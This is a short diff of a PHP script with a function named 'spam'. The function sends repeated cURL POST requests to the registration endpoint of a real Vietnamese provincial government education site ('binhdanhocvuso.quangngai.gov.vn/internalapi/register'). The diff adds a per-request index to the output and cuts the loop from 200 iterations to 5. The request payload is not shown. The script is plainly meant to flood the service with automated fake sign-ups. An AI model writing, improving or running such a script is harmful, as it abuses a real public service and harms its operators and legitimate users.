@@ -1,6 +1,6 @@
 <?php
 
-function spam()
+function spam($index)
 {
     $apiUrl = "https://binhdanhocvuso.quangngai.gov.vn/internalapi/register";
 
@@ -45,17 +45,16 @@ function spam()
 
     // 4. Kiểm tra lỗi và đóng cURL
     if (curl_errno($ch)) {
-        echo 'Lỗi cURL khi gửi yêu cầu: ' . curl_error($ch);
+        echo '['.$index.'] Lỗi cURL khi gửi yêu cầu: ' . curl_error($ch).'<br>';
     } else {
-        echo "Phản hồi (Response) từ API:\n";
-        echo $response;
+        echo '['.$index.'] '.$response  .'<br>';
     }
 
     curl_close($ch);
 }
 
-for ($i=1; $i <= 200; $i++) { 
-    spam();
+for ($i=1; $i <= 5; $i++) { 
+    spam($i);
 }
 
 ?>
